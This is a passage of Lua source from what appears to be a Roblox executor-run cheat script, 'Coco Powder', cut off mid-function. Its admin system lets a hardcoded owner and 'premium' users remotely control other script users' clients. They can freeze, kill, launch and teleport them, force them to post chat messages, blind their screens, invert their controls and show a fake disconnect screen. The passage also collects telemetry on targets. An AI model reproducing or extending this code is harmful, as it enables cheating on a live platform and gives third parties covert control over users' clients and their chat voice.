OwnerAdminState.collectTargetTelemetry = function(targetPlr)
    local plr = targetPlr or OwnerAdminState.telemetryTargetPlr or resolveActiveTarget() or LP
    if not plr or not plr.Parent then plr = LP end
    local uid = plr.UserId
    local det = DetectedScriptUsers[uid]
    local isOwner = isConfiguredScriptOwner(plr)
    local isPrem = not isOwner and isConfiguredPremiumUser(plr)
    local isCoco = isOwner or isPrem or (plr == LP) or (det and det.isScriptUser and (tick() - (det.lastSeen or 0)) <= 25.0)
    local isVip = (OwnerAdminState.syncedVipIds and OwnerAdminState.syncedVipIds[uid]) or isOwner

    local roleStr = isOwner and "👑 OWNER" or (isPrem and "💎 PREMIUM" or (isCoco and "⚡ COCO USER" or "👤 PLAYER"))
    if isVip and not isOwner then roleStr = roleStr .. " · 🛡️ VIP" end

    local ch = plr.Character
    local hum = ch and ch:FindFirstChildOfClass("Humanoid")
    local root = ch and (ch:FindFirstChild("HumanoidRootPart") or ch:FindFirstChildWhichIsA("BasePart"))
    local myRoot = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")

    local hpStr = hum and string.format("%d / %d HP", math.floor(hum.Health + 0.5), math.floor(hum.MaxHealth + 0.5)) or "No Humanoid"
    local rigStr = hum and ((hum.RigType == Enum.HumanoidRigType.R15) and "R15" or "R6") or "N/A"
    local velStr = root and string.format("%.1f st/s", root.AssemblyLinearVelocity.Magnitude) or "0.0 st/s"
    local distStr = (root and myRoot and plr ~= LP) and string.format("%.1f studs", (root.Position - myRoot.Position).Magnitude) or "0.0 studs (Self)"
    local altStr = root and string.format("Y: %.1f", root.Position.Y) or "Y: N/A"

    local trackCount = 0
    if hum then
        local anim = hum:FindFirstChildOfClass("Animator")
        if anim then
            local ok, trks = pcall(function() return anim:GetPlayingAnimationTracks() end)
            if ok and trks then trackCount = #trks end
        end
    end

    local pingMs = 0
    pcall(function() pingMs = math.floor((LP:GetNetworkPing() or 0) * 1000 + 0.5) end)
    local execName = "Standard"
    pcall(function()
        local idFn = _G.identifyexecutor
        if type(idFn) == "function" then
            execName = tostring((idFn()))
        end
    end)

    local flags = {}
    if OwnerAdminState.ownerFrozenTargets[uid] or (det and det.isFrozen) then table.insert(flags, "❄️Frozen") end
    if OwnerAdminState.ownerBannedTargets[uid] then table.insert(flags, "🚫Banned") end
    if ch and ch:FindFirstChildOfClass("ForceField") then table.insert(flags, "🛡️FF") end
    if hum and hum.PlatformStand then table.insert(flags, "⚡PlatStand") end
    if root and root.Anchored then table.insert(flags, "⚓Anchored") end
    if #flags == 0 then table.insert(flags, "Active/Normal") end

    local cocoCount = 0
    for _, p in ipairs(Players:GetPlayers()) do
        local d = DetectedScriptUsers[p.UserId]
        if p == LP or isConfiguredScriptOwner(p) or isConfiguredPremiumUser(p) or (d and d.isScriptUser and (tick() - (d.lastSeen or 0)) <= 25.0) then
            cocoCount = cocoCount + 1
        end
    end

    return {
        player = plr,
        line1 = string.format("%s (@%s)  ·  %s  ·  Rig: %s", plr.DisplayName, plr.Name, roleStr, rigStr),
        line2 = string.format("Health: %s  ·  Speed: %s  ·  %s  ·  Dist: %s", hpStr, velStr, altStr, distStr),
        line3 = string.format("Tracks: %d  ·  State: %s  ·  Coco Users: %d/%d", trackCount, table.concat(flags, ", "), cocoCount, #Players:GetPlayers()),
        line4 = string.format("Local Ping: %d ms  ·  FPS: %d  ·  Executor: %s", pingMs, OwnerAdminState.localFps or 60, execName),
    }
end

end -- end Beacon constants scope

-- Process incoming Owner / Premium Admin Command (from either Beacon or Chat)
local function handleIncomingOwnerCommand(senderPlr, cmdType, targetCode, rawTargetName, customMsg)
    if not senderPlr or senderPlr == LP then return end
    local senderIsOwner = isConfiguredScriptOwner(senderPlr)
    local senderIsPremium = isConfiguredPremiumUser(senderPlr)
    if not senderIsOwner and not senderIsPremium then return end

    -- Only the Script Owner (shivyy73) is immune to Admin commands (Premium users are NOT immune)!
    if isConfiguredScriptOwner(LP) then return end

    local myCode = getPlayerTargetCode(LP)
    local isTargeted = false

    if targetCode ~= nil then
        isTargeted = (targetCode == 0 or targetCode == myCode)
    elseif rawTargetName and rawTargetName ~= "" then
        local q = rawTargetName:lower():gsub("^%s*@+%s*", "")
        if q == "all" or q == "everyone" or q == "others" then
            isTargeted = true
        elseif LP.Name:lower():find(q, 1, true) == 1 or LP.DisplayName:lower():find(q, 1, true) == 1 then
            isTargeted = true
        end
    end

    if not isTargeted then return end

    local dedupeKey = tostring(senderPlr.UserId) .. "_" .. tostring(cmdType) .. "_" .. tostring(targetCode or rawTargetName or "0") .. "_" .. tostring(customMsg or "")
    local lastTime = OwnerAdminState.lastProcessedCmd[dedupeKey] or 0
    local cooldown = (cmdType == "chat" or (type(cmdType) == "number" and cmdType >= 92)) and 0.45 or 2.6
    if tick() - lastTime < cooldown then return end
    OwnerAdminState.lastProcessedCmd[dedupeKey] = tick()

    if cmdType == 12 or cmdType == "freeze" then
        applyOwnerFreezeState(true, senderPlr.Name)
    elseif cmdType == 22 or cmdType == "unfreeze" then
        applyOwnerFreezeState(false, senderPlr.Name)
    elseif cmdType == 32 or cmdType == "ban" then
        applyOwnerScriptBan(senderPlr.Name)
    elseif cmdType == 42 or cmdType == "unban" then
        clearOwnerScriptBan(senderPlr.Name)
    elseif cmdType == 52 or cmdType == "bring" then
        bringLocalPlayerToOwner(senderPlr)
    elseif cmdType == 62 or cmdType == "notify" then
        local roleTitle = senderIsOwner and "👑 SCRIPT OWNER BROADCAST" or "💎 PREMIUM ADMIN BROADCAST"
        notifyOwnerJoinedServer(
            senderPlr,
            roleTitle,
            "@" .. senderPlr.Name .. " sent a server-wide alert to all Coco Powder users!"
        )
    elseif (cmdType == 72 or cmdType == "grantprem") and senderIsOwner then
        OwnerAdminState.sessionPremiumUsers[LP.UserId] = true
        if OwnerAdminState.refreshAdminUIFn then pcall(OwnerAdminState.refreshAdminUIFn) end
        if OwnerAdminState.syncAdminTabVisibility then pcall(OwnerAdminState.syncAdminTabVisibility) end
        showOwnerScreenBanner("💎 PREMIUM ACCESS GRANTED!", "Owner @" .. senderPlr.Name .. " granted you Premium & Admin Panel access!", Color3.fromRGB(56, 224, 255), 5.5, nil)
    elseif (cmdType == 82 or cmdType == "revokeprem") and senderIsOwner then
        OwnerAdminState.sessionPremiumUsers[LP.UserId] = nil
        if OwnerAdminState.refreshAdminUIFn then pcall(OwnerAdminState.refreshAdminUIFn) end
        if OwnerAdminState.syncAdminTabVisibility then pcall(OwnerAdminState.syncAdminTabVisibility) end
        notify("👑 OWNER ADMIN", "Your temporary Session Premium access was revoked by @" .. senderPlr.Name)
    elseif cmdType == "chat" or cmdType == 92 or cmdType == 93 or cmdType == 94 or cmdType == 95 or cmdType == 96 then
        local beaconPresetMap = {
            [92] = "shivyy73 is the goat 👑",
            [93] = "Coco Powder on top! ⚡",
            [94] = "Help I got frozen by admin! 🥶",
            [95] = "I apologize to the Admin! 🏳️",
            [96] = "I love dancing in public! 💃",
        }
        local msgToSend = (customMsg and customMsg ~= "") and tostring(customMsg) or beaconPresetMap[cmdType] or "Coco Powder on top! ⚡"
        if msgToSend ~= "" then
            pcall(function()
                snd2(msgToSend)
            end)
            notify("💬 CHAT CONTROLLED", "@" .. senderPlr.Name .. " forced you to say: '" .. msgToSend .. "'")
        end
    elseif cmdType == 102 or cmdType == "dance" or cmdType == "emote" then
        -- Force Viral Dance Emote on Target Script User
        local ch = LP.Character
        local hum = ch and ch:FindFirstChildOfClass("Humanoid")
        local anim = hum and (hum:FindFirstChildOfClass("Animator") or Instance.new("Animator", hum))
        if anim and hum then
            pcall(function()
                local danceId = (hum.RigType == Enum.HumanoidRigType.R6) and "rbxassetid://182436935" or "rbxassetid://10714389396"
                local aObj = Instance.new("Animation")
                aObj.AnimationId = danceId
                local trk = anim:LoadAnimation(aObj)
                trk.Priority = Enum.AnimationPriority.Action4
                trk.Looped = true
                trk:Play(0.1, 1, 1.35)
                task.delay(9.0, function()
                    pcall(function() trk:Stop(0.2); trk:Destroy(); aObj:Destroy() end)
                end)
            end)
            notify("💃 ADMIN EMOTE", "@" .. senderPlr.Name .. " forced your character to dance!")
            sSuccess()
        end
    elseif cmdType == 112 or cmdType == "skylaunch" or cmdType == "launch" then
        -- Launch Target Script User High Into the Sky
        local ch = LP.Character
        local rt = ch and (ch:FindFirstChild("HumanoidRootPart") or ch:FindFirstChildWhichIsA("BasePart"))
        local hum = ch and ch:FindFirstChildOfClass("Humanoid")
        if rt then
            pcall(function()
                rt.Anchored = false
                if hum then hum.Sit = false end
                local launchCF = rt.CFrame + Vector3.new(0, 180, 0)
                markIntentionalTeleport(launchCF)
                rt.CFrame = launchCF
                rt.AssemblyLinearVelocity = Vector3.new(math.random(-35, 35), 260, math.random(-35, 35))
            end)
            notify("🚀 SKY LAUNCHED", "@" .. senderPlr.Name .. " launched you into the stratosphere!")
            sWhoosh()
        end
    elseif cmdType == 122 or cmdType == "reset" or cmdType == "kill" then
        -- Force Respawn / Reset Target Script User
        local ch = LP.Character
        local hum = ch and ch:FindFirstChildOfClass("Humanoid")
        if hum then
            pcall(function() hum.Health = 0 end)
        end
        if ch then
            pcall(function() ch:BreakJoints() end)
        end
        notify("💀 ADMIN RESET", "@" .. senderPlr.Name .. " forced your character to reset!")
        sError()
    elseif cmdType == 132 or cmdType == "blind" or cmdType == "unblind" then
        -- Toggle Screen Blind / Cosmic Fog Overlay on Target Script User
        local nextBlind = (cmdType == "blind") and true or ((cmdType == "unblind") and false or (not OwnerAdminState.isBlindedByOwner))
        OwnerAdminState.isBlindedByOwner = nextBlind
        if OwnerAdminState.blindGui then pcall(function() OwnerAdminState.blindGui:Destroy() end); OwnerAdminState.blindGui = nil end
        if OwnerAdminState.blindBlur then pcall(function() OwnerAdminState.blindBlur:Destroy() end); OwnerAdminState.blindBlur = nil end
        if nextBlind then
            pcall(function()
                local bBlur = Instance.new("BlurEffect")
                bBlur.Name = "CocoAdminBlindBlur"
                bBlur.Size = 56
                bBlur.Parent = game:GetService("Lighting")
                OwnerAdminState.blindBlur = bBlur

                local bGui = Instance.new("ScreenGui")
                bGui.Name = "CocoAdminBlindGui"
                bGui.IgnoreGuiInset = true
                bGui.DisplayOrder = 999999
                bGui.ResetOnSpawn = false
                bGui.Parent = GuiParent or LP:FindFirstChildOfClass("PlayerGui")

                local bg = Instance.new("Frame", bGui)
                bg.Size = UDim2.new(1, 0, 1, 0)
                bg.BackgroundColor3 = Color3.fromRGB(6, 5, 10)
                bg.BackgroundTransparency = 0.03

                local lbl = Instance.new("TextLabel", bg)
                lbl.Size = UDim2.new(1, -40, 0, 80)
                lbl.Position = UDim2.new(0, 20, 0.5, -40)
                lbl.BackgroundTransparency = 1
                lbl.Text = "👁️ BLINDED BY ADMIN @" .. senderPlr.Name:upper() .. " — Waiting for Admin to restore your vision..."
                lbl.TextColor3 = Color3.fromRGB(244, 63, 94)
                lbl.Font = Enum.Font.GothamBold
                lbl.TextSize = 18
                lbl.TextWrapped = true

                OwnerAdminState.blindGui = bGui
            end)
            notify("👁️ BLINDED BY ADMIN", "@" .. senderPlr.Name .. " blinded your screen!")
            sError()
        else
            notify("✅ VISION RESTORED", "@" .. senderPlr.Name .. " restored your vision!")
            sSuccess()
        end
    elseif cmdType == 142 or cmdType == "puppet" then
        -- 1. Force Puppeteer / Remote Animation Sync onto Sender (or specified target)
        local leader = senderPlr
        if customMsg and customMsg ~= "" then
            local q = customMsg:lower():gsub("^%s*@+%s*", "")
            for _, p in ipairs(Players:GetPlayers()) do
                if p.Name:lower():find(q, 1, true) == 1 or p.DisplayName:lower():find(q, 1, true) == 1 then
                    leader = p
                    break
                end
            end
        end
        if AnimCopySys and leader and leader ~= LP then
            OwnerAdminState.puppetModeActive = true
            OwnerAdminState.puppetLeader = leader
            pcall(function()
                AnimCopySys.syncMotorTransforms = true
                AnimCopySys:Start(leader)
            end)
            notify("🎭 ADMIN PUPPETEER", "Mirroring @" .. leader.Name .. "'s animations in real time!")
            sSuccess()
        end
    elseif cmdType == 143 or cmdType == "unpuppet" then
        OwnerAdminState.puppetModeActive = false
        OwnerAdminState.puppetLeader = nil
        if AnimCopySys and AnimCopySys.active then
            pcall(function() AnimCopySys:Stop(false) end)
        end
        notify("🎭 PUPPETEER STOPPED", "@" .. senderPlr.Name .. " released Animation Puppeteer lock!")
        sToggleOff()
    elseif cmdType == 152 or cmdType == 153 or cmdType == 154 or cmdType == 155 or cmdType == "formation" then
        -- 2. Coordinated Swarm / Orbit & Bodyguard Formation
        local modeMap = { [152] = "ring", [153] = "wall", [154] = "vwings", [155] = "line" }
        local chosenMode = modeMap[cmdType] or (customMsg and customMsg:match("^(%w+)")) or "ring"
        local centerPlr = senderPlr
        if customMsg and customMsg:find(":", 1, true) then
            local mPart, tPart = customMsg:match("^(%w+):(.+)$")
            if mPart then chosenMode = mPart:lower() end
            if tPart and tPart ~= "" then
                local q = tPart:lower():gsub("^%s*@+%s*", "")
                for _, p in ipairs(Players:GetPlayers()) do
                    if p.Name:lower():find(q, 1, true) == 1 or p.DisplayName:lower():find(q, 1, true) == 1 then
                        centerPlr = p
                        break
                    end
                end
            end
        end
        OwnerAdminState.startAdminFormation(chosenMode, centerPlr)
        notify("🛸 SQUAD FORMATION", "Joined @" .. centerPlr.Name .. "'s [" .. chosenMode:upper() .. "] formation!")
        sWhoosh()
    elseif cmdType == 156 or cmdType == "unformation" then
        OwnerAdminState.stopAdminFormation()
        notify("🛸 FORMATION DISBANDED", "@" .. senderPlr.Name .. " disbanded the squad formation!")
        sToggleOff()
    elseif cmdType == 162 or cmdType == 163 or cmdType == 164 or cmdType == 165 or cmdType == "skydestroy" then
        -- 3. Remote Sky Destroyer Trigger
        local subMode = customMsg and customMsg:lower() or ""
        if cmdType == 162 or subMode == "all" or subMode == "" then
            if _G.startSkyDestroyer then pcall(_G.startSkyDestroyer) end
        elseif cmdType == 163 or subMode == "ground" then
            if _G.SetCoverGround then pcall(_G.SetCoverGround, true) end
        elseif cmdType == 164 or subMode == "sky" then
            if _G.SetCoverSky then pcall(_G.SetCoverSky, true) end
        elseif cmdType == 165 or subMode == "cube" then
            if _G.SetCoverCubeMatrix then pcall(_G.SetCoverCubeMatrix, true) end
        end
        notify("💥 REMOTE SKY DESTROYER", "@" .. senderPlr.Name .. " activated your Coca Sky Destroyer!")
    elseif cmdType == 166 or cmdType == "skystop" then
        if _G.stopSkyDestroyer then pcall(_G.stopSkyDestroyer) end
        notify("💥 REMOTE SKY DESTROYER", "@" .. senderPlr.Name .. " stopped your Coca Sky Destroyer!")
    elseif cmdType == 172 or cmdType == "countdown" then
        -- 4A. Synchronized 3-2-1-GO Group Countdown
        task.spawn(function()
            local steps = { "3... ⏳", "2... ⚡", "1... 🔥", customMsg and customMsg ~= "" and customMsg or "👑 COCO POWDER ON TOP! ⚡" }
            for _, line in ipairs(steps) do
                pcall(function() snd2(line) end)
                task.wait(1.05)
            end
        end)
        notify("⏱️ SYNC COUNTDOWN", "@" .. senderPlr.Name .. " started a synchronized group countdown!")
    elseif cmdType == 173 or cmdType == "wavechat" then
        -- 4B. Staggered Mexican Wave Chat
        local myIdx = OwnerAdminState.computeSortedCocoSquadIndex()
        local waveMsg = (customMsg and customMsg ~= "") and customMsg or ("🌊 COCO WAVE #" .. tostring(myIdx) .. " ⚡")
        task.delay((myIdx - 1) * 0.35, function()
            pcall(function() snd2(waveMsg) end)
        end)
        notify("🌊 WAVE CHAT", "@" .. senderPlr.Name .. " triggered a cascading chat wave!")
    elseif cmdType == 174 or cmdType == "chant" then
        -- 4C. Hype Squad Chant
        task.spawn(function()
            local lines = {
                "⚡ ALL HAIL @" .. senderPlr.Name:upper() .. "! 👑",
                "💎 COCO POWDER V36.8 SUPREME SQUAD! 🚀",
            }
            for _, ln in ipairs(lines) do
                pcall(function() snd2(ln) end)
                task.wait(1.25)
            end
        end)
    elseif cmdType == 182 or cmdType == "invert" then
        -- 5A. Invert Controls Prank
        OwnerAdminState.toggleAdminInvertControls(nil, senderPlr.Name)
    elseif cmdType == 183 or cmdType == "drunk" then
        -- 5B. Drunk Camera FOV + Rainbow Wobble Prank
        OwnerAdminState.toggleAdminDrunkMode(nil, senderPlr.Name)
    elseif cmdType == 184 or cmdType == "flashbang" then
        -- 5C. Solar Flashbang Prank
        OwnerAdminState.triggerAdminFlashbang(senderPlr.Name)
    elseif cmdType == 185 or cmdType == "fakemodal" then
        -- 5D. Fake Roblox Disconnected Modal Prank
        OwnerAdminState.triggerAdminFakeKickModal(senderPlr.Name)
    elseif cmdType == 186 or cmdType == "clearfx" then
        -- 5E. Clear All Visual Pranks & Restores
        OwnerAdminState.clearAllAdminVisualPranks()
        notify("✅ FX CLEARED", "@" .. senderPlr.Name .. " cleared all visual prank effects!")
        sSuccess()
    elseif cmdType == 192 or cmdType == "tppos" then
        -- 7A. Global Server Waypoint / Coordinate / Cursor Summon
        local destCF = nil
        if customMsg and customMsg ~= "" then
            local x, y, z = customMsg:match("^([%-%.%d]+)%s+([%-%.%d]+)%s+([%-%.%d]+)")
            if x and y and z then
                destCF = CFrame.new(tonumber(x), tonumber(y), tonumber(z))
            end
        end
        if not destCF and senderPlr.Character then
            local sRoot = senderPlr.Character:FindFirstChild("HumanoidRootPart")
            if sRoot then
                local myIdx, total = OwnerAdminState.computeSortedCocoSquadIndex()
                local ang = ((myIdx - 1) / math.max(total, 1)) * (math.pi * 2)
                destCF = sRoot.CFrame * CFrame.new(math.cos(ang) * 4.5, 0.5, -4.5 + math.sin(ang) * 2.5)
            end
        end
        if destCF and LP.Character then
            markIntentionalTeleport(destCF)
            safeReturnFromVoid(LP.Character, destCF)
            notify("📍 GLOBAL WAYPOINT", "Teleported to @" .. senderPlr.Name .. "'s Admin Waypoint!")
            sWhoosh()
        end
    elseif cmdType == 193 or cmdType == "skylounge" then
        -- 7B. Spawn & Summon to VIP Sky Lounge
        local refPos = Vector3.new(0, 50, 0)
        if senderPlr.Character and senderPlr.Character:FindFirstChild("HumanoidRootPart") then
            refPos = senderPlr.Character.HumanoidRootPart.Position
        elseif LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
            refPos = LP.Character.HumanoidRootPart.Position
        end
        OwnerAdminState.spawnOrTeleportToSkyLounge(refPos)
        notify("🌌 VIP SKY LOUNGE", "@" .. senderPlr.Name .. " summoned you to the Admin VIP Sky Lounge!")
        sSuccess()
    elseif cmdType == 194 or cmdType == "groundreturn" then
        OwnerAdminState.destroySkyLoungeAndReturn()
        notify("🌌 SKY LOUNGE CLOSED", "Returned to ground from VIP Sky Lounge!")
        sToggleOff()
    elseif cmdType == 202 or cmdType == "syncvip" then
        -- 8A. Protected VIP / Bodyguard Whitelist Sync
        OwnerAdminState.syncedVipIds[senderPlr.UserId] = true
        if customMsg and customMsg ~= "" then
            for numStr in customMsg:gmatch("(%d+)") do
                local uid = tonumber(numStr)
                if uid then
                    OwnerAdminState.syncedVipIds[uid] = true
                end
            end
        end
        notify("🛡️ VIP WHITELIST SYNCED", "Synced Protected VIP list from @" .. senderPlr.Name .. "!")
        sSuccess()
    elseif cmdType == 203 or cmdType == "bodyguard" then
        -- 8B. Toggle Auto-Bodyguard Retaliation Mode
        OwnerAdminState.toggleAdminBodyguardAutoRetaliate(nil, senderPlr)
        notify("🛡️ VIP BODYGUARD", OwnerAdminState.bodyguardModeActive and ("Bodyguard Mode ON — protecting @" .. senderPlr.Name .. "!") or "Bodyguard Mode OFF")
    elseif cmdType == 204 or cmdType == "clearvip" then
        OwnerAdminState.syncedVipIds = {}
        OwnerAdminState.toggleAdminBodyguardAutoRetaliate(false, senderPlr)
        notify("🛡️ VIP CLEARED", "@" .. senderPlr.Name .. " cleared synced VIP & Bodyguard states!")
    end
end

-- Overhead Name Tag (BillboardGui) Renderer for Owner (👑), Premium Users (💎) & Script Users (⚡)
removeOverheadTagForUser = function(uid)
    local entry = OverheadTagGuis[uid]
    if entry then
        if entry.gui then pcall(function() entry.gui:Destroy() end) end
        OverheadTagGuis[uid] = nil
    end
end

updateOverheadNameTags = function()
    if not OwnerAdminState.overheadTagsEnabled or OwnerAdminState.isBannedByOwner then
        if next(OverheadTagGuis) ~= nil then
            for uid, _ in pairs(OverheadTagGuis) do
                removeOverheadTagForUser(uid)
            end
        end
        return
    end

    local parentContainer = GuiParent or LP:FindFirstChildOfClass("PlayerGui")
    if not parentContainer then return end

    local activeUids = {}
    for _, plr in ipairs(Players:GetPlayers()) do
        local uid = plr.UserId
        local det = DetectedScriptUsers[uid]
        -- Only the exact configured account username/UserId receives a special badge.
        -- A public animation beacon or a matching DisplayName can never grant Premium.
        local plrIsOwner = isConfiguredScriptOwner(plr)
        local plrIsPremium = not plrIsOwner and isConfiguredPremiumUser(plr)
        -- Regular-player tags are shown ONLY when this client has a fresh
        -- COCO beacon observation for that player. Do not tag every server player.
        -- Owner/Premium badges remain allowlist-based and do not depend on detection.
        local beaconFresh = det ~= nil
            and det.isScriptUser == true
            and (tick() - (tonumber(det.lastSeen) or 0)) <= 25.0
        -- Normal players who are NOT using the script NEVER get a nametag!
        local plrIsScriptUser = plrIsOwner or plrIsPremium
            or (beaconFresh and OwnerAdminState.showNormalPlayerTags == true)

        if plr == LP and not OwnerAdminState.showSelfOverheadTag then
            plrIsScriptUser = false
        end

        local ch = plr.Character
        local adorneePart = ch and (ch:FindFirstChild("Head") or ch:FindFirstChild("HumanoidRootPart"))

        if plrIsScriptUser and adorneePart then
            activeUids[uid] = true
            local entry = OverheadTagGuis[uid]
            if not entry or not entry.gui or not entry.gui.Parent then
                local bbg = Instance.new("BillboardGui")
                bbg.Name = "CocoPowderTag_" .. tostring(uid)
                bbg.Size = UDim2.new(0, 152, 0, 26)
                bbg.StudsOffset = Vector3.new(0, 2.2, 0)
                bbg.AlwaysOnTop = true
                bbg.MaxDistance = 350
                bbg.ResetOnSpawn = false
                bbg.Adornee = adorneePart
                bbg.Parent = parentContainer

                local bg = Instance.new("Frame")
                bg.Size = UDim2.new(1, 0, 1, 0)
                bg.Position = UDim2.new(0, 0, 0, 0)
                bg.BackgroundColor3 = Color3.fromRGB(14, 11, 20)
                bg.BackgroundTransparency = 0.12
                bg.BorderSizePixel = 0
                bg.Parent = bbg
                Instance.new("UICorner", bg).CornerRadius = UDim.new(1, 0)

                local st = Instance.new("UIStroke")
                st.Thickness = 1.0
                st.Transparency = 0.22
                st.Parent = bg

                local roleLbl = Instance.new("TextLabel")
                roleLbl.Size = UDim2.new(1, -12, 0, 12)
                roleLbl.Position = UDim2.new(0, 6, 0, 2)
                roleLbl.BackgroundTransparency = 1
                roleLbl.Font = Enum.Font.GothamBold
                roleLbl.TextSize = 8
                roleLbl.TextTruncate = Enum.TextTruncate.AtEnd
                roleLbl.Parent = bg

                local nameLbl = Instance.new("TextLabel")
                nameLbl.Size = UDim2.new(1, -12, 0, 10)
                nameLbl.Position = UDim2.new(0, 6, 0, 13)
                nameLbl.BackgroundTransparency = 1
                nameLbl.Font = Enum.Font.GothamMedium
                nameLbl.TextSize = 7.5
                nameLbl.TextColor3 = Color3.fromRGB(220, 215, 235)
                nameLbl.TextTruncate = Enum.TextTruncate.AtEnd
                nameLbl.Parent = bg

                entry = {
                    gui = bbg,
                    bg = bg,
                    stroke = st,
                    roleLbl = roleLbl,
                    nameLbl = nameLbl,
                }
                OverheadTagGuis[uid] = entry
            end

            if entry.gui.Adornee ~= adorneePart then
                entry.gui.Adornee = adorneePart
            end
            local isFrozen = (det and det.isFrozen) or OwnerAdminState.ownerFrozenTargets[uid] or (plr == LP and OwnerAdminState.isFrozenByOwner)
            local isBanned = OwnerAdminState.ownerBannedTargets[uid]
            local roleKey = plrIsOwner and "OWNER" or (plrIsPremium and "PREMIUM" or (isBanned and "BANNED" or (isFrozen and "FROZEN" or "USER")))
            if entry.lastRoleKey ~= roleKey then
                entry.lastRoleKey = roleKey
                if roleKey == "OWNER" then
                    entry.roleLbl.Text = "👑 COCO POWDER OWNER"
                    entry.roleLbl.TextColor3 = Color3.fromRGB(255, 215, 70)
                    entry.stroke.Color = Color3.fromRGB(255, 215, 70)
                elseif roleKey == "PREMIUM" then
                    entry.roleLbl.Text = "💎 COCO POWDER PREMIUM"
                    entry.roleLbl.TextColor3 = Color3.fromRGB(56, 224, 255)
                    entry.stroke.Color = Color3.fromRGB(56, 224, 255)
                elseif roleKey == "BANNED" then
                    entry.roleLbl.Text = "🚫 SCRIPT BANNED · CP USER"
                    entry.roleLbl.TextColor3 = Color3.fromRGB(244, 63, 94)
                    entry.stroke.Color = Color3.fromRGB(244, 63, 94)
                elseif roleKey == "FROZEN" then
                    entry.roleLbl.Text = "❄️ FROZEN BY ADMIN · CP USER"
                    entry.roleLbl.TextColor3 = Color3.fromRGB(86, 204, 255)
                    entry.stroke.Color = Color3.fromRGB(86, 204, 255)
                else
                    entry.roleLbl.Text = "⚡ COCO POWDER USER"
                    entry.roleLbl.TextColor3 = T.Neon
                    entry.stroke.Color = T.Accent
                end
            end
            local desiredName = plr.DisplayName .. " (@" .. plr.Name .. ")"
            if entry.lastNameText ~= desiredName then
                entry.lastNameText = desiredName
                entry.nameLbl.Text = desiredName
            end
        end
    end

    for uid, _ in pairs(OverheadTagGuis) do
        if not activeUids[uid] then
            removeOverheadTagForUser(uid)
        end
    end
end

-- Parse Chat Commands from Owner or Premium Users (!freeze, !unfreeze, !scban, !unban, !bring, !ownermsg)
local function onPlayerChatMessage(senderPlr, rawText)
    if not senderPlr or not rawText or rawText == "" then return end
    local senderHasAdmin = isConfiguredScriptOwner(senderPlr)
        or isConfiguredPremiumUser(senderPlr)
        or (OwnerAdminState and OwnerAdminState.sessionPremiumUsers and OwnerAdminState.sessionPremiumUsers[senderPlr.UserId])
        or (hasAdminAccess and hasAdminAccess(senderPlr))
    if not senderHasAdmin then return end

    -- Live Chat Puppet Mirror: If sender is LP and Chat Puppet Mode is ON, broadcast normal chat messages to all script users!
    local clean = rawText:gsub("^/e%s+", ""):gsub("^/w%s+%S+%s+", "")
    local cmd, arg = clean:match("^!([%w_]+)%s*(.-)%s*$")
    if not cmd then
        if senderPlr == LP and OwnerAdminState.chatPuppetMode and hasAdminAccess(LP) and clean ~= "" then
            if tick() - (OwnerAdminState.lastPuppetBroadcastTick or 0) > 0.6 then
                OwnerAdminState.lastPuppetBroadcastTick = tick()
                task.defer(function()
                    OwnerAdminState.broadcastOwnerChatCommand(nil, clean)
                end)
            end
        end
        return
    end
    cmd = cmd:lower()

    if cmd == "cpfreeze" or cmd == "freeze" then
        handleIncomingOwnerCommand(senderPlr, "freeze", nil, arg ~= "" and arg or "all")
    elseif cmd == "cpunfreeze" or cmd == "unfreeze" then
        handleIncomingOwnerCommand(senderPlr, "unfreeze", nil, arg ~= "" and arg or "all")
    elseif cmd == "cpban" or cmd == "scban" or cmd == "scriptban" then
        handleIncomingOwnerCommand(senderPlr, "ban", nil, arg)
    elseif cmd == "cpunban" or cmd == "unban" then
        handleIncomingOwnerCommand(senderPlr, "unban", nil, arg ~= "" and arg or "all")
    elseif cmd == "cpbring" or cmd == "bring" then
        handleIncomingOwnerCommand(senderPlr, "bring", nil, arg ~= "" and arg or "all")
    elseif cmd == "cpdance" or cmd == "dance" or cmd == "cpemote" then
        handleIncomingOwnerCommand(senderPlr, "dance", nil, arg ~= "" and arg or "all")
    elseif cmd == "cplaunch" or cmd == "skylaunch" or cmd == "launch" then
        handleIncomingOwnerCommand(senderPlr, "skylaunch", nil, arg ~= "" and arg or "all")
    elseif cmd == "cpreset" or cmd == "reset" or cmd == "cpkill" then
        handleIncomingOwnerCommand(senderPlr, "reset", nil, arg ~= "" and arg or "all")
    elseif cmd == "cpblind" or cmd == "blind" then
        handleIncomingOwnerCommand(senderPlr, "blind", nil, arg ~= "" and arg or "all")
    elseif cmd == "cpunblind" or cmd == "unblind" then
        handleIncomingOwnerCommand(senderPlr, "unblind", nil, arg ~= "" and arg or "all")
    elseif cmd == "cpgrantprem" or cmd == "grantprem" then
        handleIncomingOwnerCommand(senderPlr, "grantprem", nil, arg)
    elseif cmd == "cprevokeprem" or cmd == "revokeprem" then
        handleIncomingOwnerCommand(senderPlr, "revokeprem", nil, arg)
    elseif cmd == "cpchat" or cmd == "forcesay" or cmd == "say" or cmd == "chat" or cmd == "cpsay" or cmd == "controlchat" then
        local targetArg, chatMsg = arg:match("^(@?[%w_]+)%s+(.+)$")
        if not targetArg then
            targetArg = "all"
            chatMsg = arg
        end
        if chatMsg and chatMsg ~= "" then
            handleIncomingOwnerCommand(senderPlr, "chat", nil, targetArg, chatMsg)
        end
    elseif cmd == "cpnotify" or cmd == "ownermsg" then
        if senderPlr ~= LP then
            local title = isConfiguredScriptOwner(senderPlr) and "👑 OWNER ANNOUNCEMENT" or "💎 PREMIUM ANNOUNCEMENT"
            notifyOwnerJoinedServer(
                senderPlr,
                title,
                (arg and arg ~= "") and arg or ("@" .. senderPlr.Name .. " is in your server!")
            )
        end
    elseif cmd == "cppuppet" or cmd == "puppet" then
        local tArg, leaderArg = arg:match("^(%S+)%s*(.-)$")
        handleIncomingOwnerCommand(senderPlr, "puppet", nil, (tArg and tArg ~= "") and tArg or "all", leaderArg)
    elseif cmd == "cpunpuppet" or cmd == "unpuppet" then
        handleIncomingOwnerCommand(senderPlr, "unpuppet", nil, arg ~= "" and arg or "all")
    elseif cmd == "cpform" or cmd == "formation" then
        local tArg, modeArg = arg:match("^(%S+)%s*(.-)$")
        handleIncomingOwnerCommand(senderPlr, "formation", nil, (tArg and tArg ~= "") and tArg or "all", (modeArg and modeArg ~= "") and modeArg or "ring")
    elseif cmd == "cpunform" or cmd == "unformation" then
        handleIncomingOwnerCommand(senderPlr, "unformation", nil, arg ~= "" and arg or "all")
